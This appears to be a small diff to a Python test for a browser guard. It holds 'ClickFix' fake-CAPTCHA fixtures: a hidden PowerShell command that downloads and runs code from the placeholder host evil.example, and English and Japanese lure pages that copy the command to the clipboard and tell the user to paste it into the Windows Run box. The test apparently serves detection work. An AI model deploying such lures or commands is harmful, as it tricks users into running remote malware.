@@ -72,7 +72,7 @@ def test_guard_in_browser():
 CMD = 'powershell -w h -c "iex(irm https://evil.example/x)" # I am not a robot - Verification ID: 4821'
 CMDJS = f"<script>var CMD = {json.dumps(CMD)};</script>"
 CLICKFIX = {
-    "writeText": CMDJS + f"""<h2>Verify you are human</h2><p>Press Win + R, then Ctrl + V and Enter.</p>
+    "writeText": CMDJS + """<h2>Verify you are human</h2><p>Press Win + R, then Ctrl + V and Enter.</p>
 <button id="b" onclick="navigator.clipboard.writeText(CMD)">I'm not a robot</button>""",
     "execCommand": f"""<h2>ロボットではありません</h2><p>Windows キー + R を押して貼り付けてください</p>
 <textarea id="t" style="position:absolute;left:-9999px">{html.escape(CMD)}</textarea>
